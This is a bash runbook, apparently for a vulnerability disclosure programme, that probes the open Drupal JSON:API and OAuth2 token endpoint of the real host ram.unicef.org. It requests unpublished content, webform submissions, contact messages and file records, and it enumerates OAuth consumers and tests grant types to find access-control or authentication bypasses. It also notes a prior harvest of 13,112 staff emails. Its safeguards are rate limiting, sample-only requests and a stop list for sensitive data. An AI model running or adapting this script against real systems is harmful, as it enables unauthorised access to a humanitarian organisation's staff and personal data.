#!/usr/bin/env bash
# =============================================================================
# UNICEF VDP — ram.unicef.org deep JSON:API + OAuth2 (session3)
# Portable: Linux / Pi / Termux. curl + python3 only.
#
# ram.unicef.org is the ONE Drupal instance with an OPEN JSON:API (others 403/301).
# F001 covered user/user (13,112 staff emails — SUBMITTED). This goes after the
# REST of ram's open API for NEW, distinct findings:
#   - UNPUBLISHED content (?filter[status]=0) = access-control bypass
#   - WEBFORM submissions / contact_message = real form PII
#   - file/media = info leak (internal paths/private files)
#   - OAuth2 chain: enumerate consumer entities (client UUIDs/redirect/secret-null?)
#     + probe /oauth/token grants (password/client_credentials) -> token issuance
#     / auth bypass if a consumer is misconfigured.
#
# SAFETY (humanitarian org): >=1 req/sec, read-only GET (+ one benign OAuth POST),
# SAMPLE ONLY (page-size 1, confirm existence), HARD STOP + flag on beneficiary/
# child/health-looking data, redact samples. Dedup vs F001 (user emails).
#
# Run (Termux): OUTDIR=$HOME/un3 bash runbooks/PI-RUNBOOK-unicef-session3-ram-deep.sh \
#                 2>&1 | tee $HOME/un3/un3.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/un3
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/un3"
  else OUTDIR="$HOME/un3"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
PACE="${PACE:-1.2}"
H="${HOST:-ram.unicef.org}"; B="https://$H"
echo "============================================================"
echo "UNICEF ram DEEP  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Host: $H   pace: ${PACE}s/req   SAFETY: sample-only, stop-on-sensitive"
echo "============================================================"; echo ""
J(){ curl -s --max-time 18 -H "User-Agent: $UA" -H 'Accept: application/vnd.api+json' "$1"; }

echo "═══ PHASE A: JSON:API INDEX — all resource types ═══"
J "$B/jsonapi" > "$OUTDIR/index.json"; sleep "$PACE"
python3 - << 'PYEOF'
import os,json
O=os.environ["OUTDIR"]
try: d=json.load(open(f"{O}/index.json"))
except Exception as e: print("  index not JSON:",e); raise SystemExit
links=d.get("links",{}); types=sorted(k for k in links if "--" in k)
open(f"{O}/types.txt","w").write("\n".join(types))
print(f"  {len(types)} resource types exposed in the index")
hot=[t for t in types if any(x in t for x in ("webform","contact_message","file--","media--","comment--","node--","user--","taxonomy"))]
print("  high-value types present:")
for t in sorted(set(hot)): print("    ",t)
PYEOF
echo ""

echo "═══ PHASE B: ENTITY EXPOSURE (sample-only, dedup vs F001 user emails) ═══"
probe(){ # type-path  label
  local ep="$1" label="$2"
  local out; out=$(J "$B/jsonapi/$ep&page[limit]=1" 2>/dev/null || J "$B/jsonapi/$ep?page[limit]=1")
  sleep "$PACE"
  if echo "$out" | grep -qiE 'beneficiar|child_|date_of_birth|"dob"|patient|diagnos|refugee|gbv|national_id|"ssn"'; then
    echo "  [SENSITIVE @ $label] STOP — flag, NOT pulling."
    echo "$ep" >> "$OUTDIR/SENSITIVE.txt"; return
  fi
  local cls; cls=$(echo "$out" | python3 -c "import sys,json
try:
 d=json.load(sys.stdin); x=d.get('data')
 print('DATA' if x else ('EMPTY' if x==[] else 'NODATA'))
except Exception: print('ERR')")
  if [ "$cls" = "DATA" ]; then
    echo "  *** EXPOSED [$label]: /jsonapi/$ep"
    echo "$ep" >> "$OUTDIR/exposed.txt"
    echo "$out" | head -c 500 > "$OUTDIR/sample-$label.json"
  else
    echo "  ok   [$label]: $cls"
  fi
}
probe "node/page?filter[status]=0"            unpublished_pages
probe "node/article?filter[status]=0"         unpublished_articles
probe "webform_submission/webform_submission" webform_submissions
probe "contact_message/feedback"              contact_messages
probe "contact_message/personal"              contact_personal
probe "file/file"                             files
probe "media/image"                           media_images
probe "media/document"                        media_documents
probe "comment/comment"                       comments
probe "taxonomy_term/tags"                     taxonomy
echo ""

echo "═══ PHASE C: OAUTH2 / CONSUMER CHAIN ═══"
echo "  -- consumer entities (client ids / redirect / secret presence) --"
C=$(J "$B/jsonapi/consumer/consumer?page[limit]=5"); sleep "$PACE"
echo "$C" | python3 - << 'PYEOF'
import sys,json
try: d=json.load(sys.stdin)
except Exception: print("    consumer endpoint not JSON / not accessible"); raise SystemExit
data=d.get("data") or []
print(f"    consumers visible: {len(data)}")
for c in data[:5]:
    a=c.get("attributes",{})
    print("     -", {k:a.get(k) for k in ("label","client_id","is_default","redirect","grant_types","confidential") if k in a},
          "| id:", c.get("id"))
# flag if any consumer is non-confidential / public (token issuable without secret)
for c in data:
    a=c.get("attributes",{})
    if a.get("confidential") is False or a.get("third_party") is False:
        print("    *** non-confidential consumer (public client) — token may be issuable w/o secret:", a.get("label"), c.get("id"))
PYEOF
echo ""
echo "  -- token endpoint behavior (benign probe; no creds) --"
for GT in password client_credentials authorization_code; do
  code=$(curl -s -o "$OUTDIR/tok-$GT.txt" -w '%{http_code}' --max-time 15 -H "User-Agent: $UA" \
    -X POST "$B/oauth/token" --data "grant_type=$GT" 2>/dev/null || echo 000)
  echo "    grant_type=$GT -> HTTP $code :: $(head -c 160 "$OUTDIR/tok-$GT.txt"|tr '\n' ' ')"
  sleep "$PACE"
done
echo "  (A 200 with access_token from a public consumer = auth bypass. A descriptive"
echo "   error naming client_id/secret requirements maps the next step. 500 = the"
echo "   unhandled-exception thread from F001 recon — note the trace.)"
echo ""

echo "════════════════════════════════════════════"
echo "VERDICT"
echo "════════════════════════════════════════════"
[ -s "$OUTDIR/exposed.txt" ] && { echo "  NEW exposures (distinct from F001):"; sed 's/^/    \/jsonapi\//' "$OUTDIR/exposed.txt"; } || echo "  No new entity exposure (others may be access-controlled)."
[ -s "$OUTDIR/SENSITIVE.txt" ] && { echo "  !!! sensitive-looking (review by hand, do NOT bulk-pull):"; sed 's/^/    /' "$OUTDIR/SENSITIVE.txt"; }
echo ""
echo "  Next per hit: webform/contact = form PII (High if real personal data);"
echo "  unpublished node = access bypass (Medium); files/media = info leak; public"
echo "  OAuth consumer + token issuance = auth bypass (High). Confirm sample is real,"
echo "  redact, write a report distinct from F001."
echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
